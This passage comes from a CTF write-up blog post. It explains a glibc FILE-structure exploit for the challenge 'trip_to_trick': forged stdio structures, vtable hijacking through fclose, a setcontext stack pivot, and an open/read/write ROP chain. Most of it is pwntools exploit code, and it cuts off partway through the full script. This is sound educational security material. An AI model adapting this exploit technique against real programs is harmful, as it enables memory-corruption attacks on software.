class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable changed to _IO_HELPER_JUMPS</span></span><br></pre></td></tr></table></figure></p><p>Filling the <strong>rest</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="Control-Rip-and-stackpivot"><a href="#Control-Rip-and-stackpivot" class="headerlink" title="Control Rip and stackpivot"></a>Control Rip and stackpivot</h3><p>We can control <strong>RIP</strong> by changing <code>_finish</code> from <code>_IO_helper_jumps</code> vtable:<br><a data-fancybox="gallery" href="https://i.imgur.com/NMxH0uq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NMxH0uq.png" alt><br></a><br>And why? because <strong>fclose(stdout)</strong> will be executed in the main_function, and it uses pointers from the vtable.</p><p>Fclose closes a file stream, and releases the file pointer and related buffer, it will first call <code>_IO_unlink_it</code> to delink the specified FILE from the <code>_chain</code> list:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><p>After that will call the system interface to close it:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>Finally, the <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofclose.c#L57" target="_blank" rel="noopener">_IO_FINISH</a> in the vtable is called, which corresponds to the <strong>_IO_file_finish</strong> function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure></p><p>Now that we control the rip we need a way to stack pivot, so lets first see the value of the registers when we jump to <code>_IO_FINISH</code> pointer by changing it into <strong>0xdeadbeef</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY1</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY2</span><br><span class="line">INPUT2 += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># _FINISH</span></span><br></pre></td></tr></table></figure><p>GDB image on pagefault:<br><a data-fancybox="gallery" href="https://i.imgur.com/fuZATDk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fuZATDk.png" alt><br></a><br>So what is exactly stack pivoting? Stacking pivoting is basically changing the stack pointer to point <strong>somewhere</strong> else, we want this because this time our ropchain won’t be <strong>located</strong> in the <strong>stack</strong> but in libc, if we don’t pivot when executing <strong>ret</strong> instructions we will just <strong>jump</strong> into values <strong>in</strong> the <strong>stack</strong> which is not what we want, there is a need to change the <strong>stack pointer</strong> to point into ropchain <strong>location</strong>.</p><p>We can control the contents of <strong>RDX</strong>, to use it we need to find something like <strong>mov rsp, qword ptr [rdx]; ret</strong>, a gadget like this can be found at <strong>setcontext+0x35</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/4og8ZFu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4og8ZFu.png" alt><br></a><br>So rdx is right at <code>_IO_helper_jumps</code> so we need to put the rop_chain at <code>_IO_helper_jumps + 0xa0</code> because of the instruction <strong>mov rsp, qword ptr [rdx+0xa0];</strong>, by changing the stack pointer into the right libc address we can easily do the jumps:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line"></span><br><span class="line">ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line"></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br></pre></td></tr></table></figure><p>Again we can’t use <strong>execve</strong> but we can use <strong>open</strong>, <strong>read</strong> and <strong>write</strong> which is enought to solve the challenge. In the end we will be executing this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd= open('flag\x00', 'r') # fd will be equal to 3</span><br><span class="line">read(fd, flag_path, <span class="number">0x49</span>)</span><br><span class="line">write(<span class="number">1</span>, flag_path, <span class="number">0x49</span>)</span><br></pre></td></tr></table></figure><p>The reason why fd will be equal to 3 is because <code>_IO_LIST_ALL</code> contains a linked list of the filestreams, by default <strong>stdin</strong>,<strong>stdout</strong> and <strong>stderr</strong> are already loaded so the next is <strong>3</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0(stdin)-&gt;1(stdout)-&gt;2(stderr)-&gt;3(newfd)</span><br></pre></td></tr></table></figure></p><p>Full python code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"138.68.67.161"</span>, <span class="string">"20006"</span></span><br><span class="line">filename = <span class="string">"./trip_to_trick"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0x000014e2</span>,<span class="number">0x000013ce</span>])</span><br><span class="line">    r.recvuntil(<span class="string">'gift : '</span>)</span><br><span class="line">    SYSTEM = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">    LIBC = SYSTEM-libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    _IO_BUF_BASE = <span class="number">0x38</span></span><br><span class="line">    _IO_BUF_END = <span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    _IO_2_1_STDIN_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    _IO_2_1_STDERR_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">    _IO_2_1_STDOUT_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    </span><br><span class="line">    _IO_FILE_JUMPS = LIBC+libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    _IO_HELPER_JUMPS = _IO_2_1_STDIN_+<span class="number">0xf60</span></span><br><span class="line">    </span><br><span class="line">    _IO_STDFILE_0_LOCK = _IO_2_1_STDIN_+<span class="number">0x2b90</span></span><br><span class="line">    _IO_WIDE_DATA_0 = _IO_2_1_STDIN_+<span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_1_LOCK = _IO_2_1_STDOUT_+<span class="number">0x1e20</span></span><br><span class="line">    _IO_WIDE_DATA_1 = _IO_2_1_STDOUT_<span class="number">-0xea0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_2_LOCK = _IO_2_1_STDERR_+<span class="number">0x1ef0</span></span><br><span class="line">    _IO_WIDE_DATA_2 = _IO_2_1_STDERR_<span class="number">-0xf00</span></span><br><span class="line"></span><br><span class="line">    _IO_LIST_ALL = LIBC+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    SETCONTEXT_SPITVOT = LIBC+libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">0x35</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">    log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDIN+131</span></span><br><span class="line">    INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">    INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">    INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># _nl_global_locale</span></span><br><span class="line">    OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">        <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">            INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:    </span><br><span class="line">            INPUT2 += p64(LIBC+offset)</span><br><span class="line">    INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># STDERR</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">    INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># STDOUT</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">    INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">    INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">    INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">    INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">    INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">    INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">    INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">    